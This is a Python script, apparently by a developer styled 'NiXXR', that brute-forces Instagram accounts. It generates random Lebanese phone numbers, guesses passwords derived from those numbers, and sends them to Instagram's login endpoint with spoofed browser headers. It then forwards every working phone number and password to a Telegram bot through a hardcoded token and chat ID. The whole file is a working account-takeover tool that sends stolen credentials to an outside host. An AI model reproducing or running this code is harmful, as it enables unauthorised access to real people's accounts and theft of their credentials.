import os 
from os import system
try:
    import requests
except:
    system('pip install requests')
try:
    import random
except:
    system('pip install random')
try:
    import sys
except:
    system('pip install sys')
try:
    import user_agent
except:
    system('pip install user_agent')
try:
    import time
except:
    system('pip install time')
try:
    import colorama
except:
    system('pip install colorama')

from time import sleep
from user_agent import generate_user_agent
from sys import stdout
from random import choice
from requests import get
from colorama import Fore
tx = ('70','81','76','03','71')
Y = '\033[1;33m' #اصفر
G = '\033[2;32m' #اخضر
B = '\033[2;34m'#ازرق
W  = "\033[1;97m" #ابيض
C  = '\033[2;36m'#سمائي
R = '\033[1;31m' #احمر
G2 = '\033[1;90m'  #رمادي
I = ('1375380660')#input(B + '\n•ID : ')
T =('5142402380:AAEA-plaafaUnJ0ibo0KA9d2SgtZ7iOEQ64')# input(B + '\n\n•TKOEN : ')
os.system('clear')
LoGo = f'''{C}    _   _ _  _    \n\033[1;90m   / | / (_) |/ / |/ //  \ \n{C}  /  |/ / /|   /|   // /_/ /\n\033[1;90m / /|  / //   |/   |/ _, _/\n{C}/_/ |_/_//_/|_/_/|_/_/ |_|\n\n\n'''

def NiXXR(PWT):
    for e in PWT:
     stdout.write(e) 
     stdout.flush() 
     sleep(1/700)
NiXXR(LoGo)
NiXXR = (Fore.LIGHTYELLOW_EX+"  NiXXR")
CH00SE = input('''\033[2;36m1. +961 RANDOM\n\033[1;31m2. +961 81\n\033[2;36m3. +961 03\n\033[1;31m4. +961 71\n\033[2;36mChoose a Number: '''+Fore.RESET)
if CH00SE=='1':
    def checker():
        while True:
            N = "09876543221"
            R1 = ''.join(random.choice(tx)for t in range(1))
            R = ''.join(random.choice(N)for t in range(6))
            Username = f'+961{R1}'+R
            Password = f"{R1}"+R
            url = 'https://www.instagram.com/accounts/login/ajax/'
            headers = {
        
        
        'accept':'*/*',
        'accept-language':'en-US,en;q=0.9',
        'content-length':'378',
        'content-type':'application/x-www-form-urlencoded',
        'cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
        'origin':'https://www.instagram.com',
        'referer':'https://www.instagram.com/',
        'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'sec-ch-ua-mobile':'?0',
        'x-asbd-id':'198387',
        'user-agent': generate_user_agent(),
        'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
        'x-ig-app-id':'936619743392459',
        'x-ig-www-claim':'0',
        'x-instagram-ajax':'3bcc4d0b0733',
        'x-requested-with':'XMLHttpRequest',
        }
            data = {
       'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(Password),
        'username':Username,
        }
            respone = requests.post(url,headers=headers,data=data).text
            if "userId" in respone:            
                print(f"\033[1;32m✅ | Username: {Username} - Password: {Password}"+NiXXR+colorama.Fore.RESET)
                aC = f'''- New Successful Account ✔.
    ➬ Phone : {Username}
    ➫ Password : {Password}
    ★ Developer : @NiXXR 🦊 PWT™.'''
                requests.post(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={I}&text={aC}')

            else:
                print(f"\033[1;31m❌ | Username: {Username} - Password: {Password}"+NiXXR+colorama.Fore.RESET)
if CH00SE=='2':
    def checker():
        while True:
            N = "09876543221"
            R = ''.join(random.choice(N)for t in range(6))
            Username = '+96181'+R
            Password = "81"+R
            url = 'https://www.instagram.com/accounts/login/ajax/'
            headers = {
        
        
        'accept':'*/*',
        'accept-language':'en-US,en;q=0.9',
        'content-length':'378',
        'content-type':'application/x-www-form-urlencoded',
        'cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
        'origin':'https://www.instagram.com',
        'referer':'https://www.instagram.com/',
        'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'sec-ch-ua-mobile':'?0',
        'x-asbd-id':'198387',
        'user-agent': generate_user_agent(),
        'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
        'x-ig-app-id':'936619743392459',
        'x-ig-www-claim':'0',
        'x-instagram-ajax':'3bcc4d0b0733',
        'x-requested-with':'XMLHttpRequest',
        }
            data = {
       'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(Password),
        'username':Username,
        }
            respone = requests.post(url,headers=headers,data=data).text
            if "userId" in respone:            
                print(f"\033[1;32m✅ | Username: {Username} - Password: {Password}"+NiXXR+colorama.Fore.RESET)
                aC = f'''- New Successful Account ✔.
    ➬ Phone : {Username}
    ➫ Password : {Password}
    ★ Developer : @NiXXR 🦊 PWT™.'''
                requests.post(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={I}&text={aC}')

            else:
                print(f"\033[1;31m❌ | Username: {Username} - Password: {Password}"+NiXXR+colorama.Fore.RESET)
if CH00SE=='3':
    def checker():
        while True:
            N = "09876543221"
            R = ''.join(random.choice(N)for t in range(6))
            Username = '+96103'+R
            Password = "03"+R
            url = 'https://www.instagram.com/accounts/login/ajax/'
            headers = {
        
        
        'accept':'*/*',
        'accept-language':'en-US,en;q=0.9',
        'content-length':'378',
        'content-type':'application/x-www-form-urlencoded',
        'cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
        'origin':'https://www.instagram.com',
        'referer':'https://www.instagram.com/',
        'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'sec-ch-ua-mobile':'?0',
        'x-asbd-id':'198387',
        'user-agent': generate_user_agent(),
        'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
        'x-ig-app-id':'936619743392459',
        'x-ig-www-claim':'0',
        'x-instagram-ajax':'3bcc4d0b0733',
        'x-requested-with':'XMLHttpRequest',
        }
            data = {
       'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(Password),
        'username':Username,
        }
            respone = requests.post(url,headers=headers,data=data).text
            if "userId" in respone:            
                print(f"\033[1;32m✅ | Username: {Username} - Password: {Password}"+NiXXR+colorama.Fore.RESET)
                aC = f'''- New Successful Account ✔.
    ➬ Phone : {Username}
    ➫ Password : {Password}
    ★ Developer : @NiXXR 🦊 PWT™.'''
                requests.post(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={I}&text={aC}')

            else:
                print(f"\033[1;31m❌ | Username: {Username} - Password: {Password}"+NiXXR+colorama.Fore.RESET)

if CH00SE=='4':
    def checker():
        while True:
            N = "09876543221"
            R = ''.join(random.choice(N)for t in range(6))
            Username = '+96171'+R
            Password = "71"+R
            url = 'https://www.instagram.com/accounts/login/ajax/'
            headers = {
        
        
        'accept':'*/*',
        'accept-language':'en-US,en;q=0.9',
        'content-length':'378',
        'content-type':'application/x-www-form-urlencoded',
        'cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
        'origin':'https://www.instagram.com',
        'referer':'https://www.instagram.com/',
        'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'sec-ch-ua-mobile':'?0',
        'x-asbd-id':'198387',
        'user-agent': generate_user_agent(),
        'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
        'x-ig-app-id':'936619743392459',
        'x-ig-www-claim':'0',
        'x-instagram-ajax':'3bcc4d0b0733',
        'x-requested-with':'XMLHttpRequest',
        }
            data = {
       'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(Password),
        'username':Username,
        }
            respone = requests.post(url,headers=headers,data=data).text
            if "userId" in respone:            
                print(f"\033[1;32m✅ | Username: {Username} - Password: {Password}"+NiXXR+colorama.Fore.RESET)
                aC = f'''- New Successful Account ✔.
    ➬ Phone : {Username}
    ➫ Password : {Password}
    ★ Developer : @NiXXR 🦊 PWT™.'''
                requests.post(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={I}&text={aC}')

            else:
                print(f"\033[1;31m❌ | Username: {Username} - Password: {Password}"+NiXXR+colorama.Fore.RESET)

checker()